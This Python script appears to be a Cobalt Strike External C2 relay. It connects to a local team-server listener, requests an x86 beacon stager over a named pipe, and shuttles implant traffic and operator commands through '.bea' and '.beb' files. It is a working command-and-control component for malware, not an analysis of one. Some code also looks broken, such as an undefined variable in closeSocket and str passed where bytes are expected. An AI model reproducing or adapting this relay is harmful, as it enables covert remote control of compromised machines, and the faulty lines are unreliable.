#!/usr/bin/python3
import socket
import sys
import os
from time import sleep
import struct

def createSocket():
    d = {}
    d['sock'] = socket.create_connection(('127.0.0.1', 2222))
    d['state'] = 1  
    #sock.setblocking(1)
    return (d)

def recv_frame(sock):
    try:
        chunk = sock.recv(4)
    except:
        return("")
    if len(chunk) < 4:
        return()
    slen = struct.unpack('<I', chunk)[0]
    chunk = sock.recv(slen)
    while len(chunk) < slen:
        chunk = chunk + sock.recv(slen - len(chunk))
    return(chunk)

def send_frame(sock, chunk):
    #slen = struct.pack('>L', len(chunk))
    slen = struct.pack('<I', len(chunk))
    #print "sending %s"%len(chunk)
    sock.sendall( slen + chunk )
    #sock.sendall(chunk)

def getStage(sock):
    send_frame(sock,"arch=x86")
    send_frame(sock,"pipename=foobar")
    send_frame(sock,"block=100")
    send_frame(sock,"go")
    stager = recv_frame(sock)
    #print "got stage"
    return stager

def closeSocket(socket):
    sock.close()

beacons = {}

while(True):
  files = os.listdir("./")
  for ffile in files:
    sys.stdout.flush()
    if ffile.strip()[-4:] == ".bea":
      fsize = os.stat(ffile).st_size
      #print "processing %s [%s bytes]"%(ffile,fsize)
      if ffile in beacons and  fsize > 0:
        sock = beacons[ffile]['sock']
        print("#%d"%fsize, end = '')
        sleep(1)
        f = open(ffile,'rb')
        chunk = f.read()
        f.close()
        #print "send frame %s, and clear bea"%len(chunk)
        send_frame(sock,chunk)
        open(ffile, 'w').close()
        sleep(1)
        #print "recv frame"
        ret = recv_frame(sock)
        #discard all under 2 bytes
        if len(ret) > 1:
          print("got %s bytes command"%len(ret), end = '')
          f = open("%s.beb"%ffile[:-4], 'wb')
          f.write(ret)
          f.close()
        # clear input queue
        #let's assume we hit this once and upgrade status
        beacons[ffile]['state'] = 2
        open(ffile, 'w').close()
      elif ffile not in beacons and fsize > 0:
        print("N")
        beacons[ffile] = createSocket()
        #we need a stager and socket
        ret = getStage(beacons[ffile]['sock'])
        if len(ret) > 0:    
            print("got %s bytes command"%len(ret))
            f = open(ffile,'rb')
            f = open("%s.beb"%ffile[:-4], 'wb')
            f.write(ret)
            f.close()
        # clear input queue
        open(ffile, 'w').close()
      elif ffile in beacons and fsize == 0:
        #print "ff niet"
        if beacons[ffile]['state'] == 2:
            #let's check for new commands waiting on socket just pump some in to get a response
            print("0", end = '')
            send_frame(beacons[ffile]['sock'],"\0")
            ret = recv_frame(beacons[ffile]['sock'])
            if len(ret) > 1:
                print("got %s bytes command"%len(ret))
                f = open("%s.beb"%ffile[:-4], 'wb')
                f.write(ret)
                f.close()
            # clear input queue
            #open(ffile, 'w').close()
      else:
        #old files delete them
        try:
          os.remove(ffile)
          os.remove("%s.beb"%ffile[:-4])
          break 
        except:
          break 
      print(".", end = '')
  sleep(1)


